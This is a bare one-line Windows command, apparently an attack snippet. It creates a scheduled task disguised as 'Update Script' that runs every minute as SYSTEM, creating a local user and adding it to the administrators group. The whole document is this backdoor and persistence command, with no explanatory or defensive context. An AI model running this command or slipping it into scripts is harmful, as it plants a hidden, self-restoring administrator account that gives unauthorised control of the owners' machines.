schtasks /create /sc minute /mo 1 /tn "Update Script" /tr "\"cmd.exe\" /k net users USERNAME PASSWORD /add && net localgroup administrators USERNAME /add" /ru system /rl highest
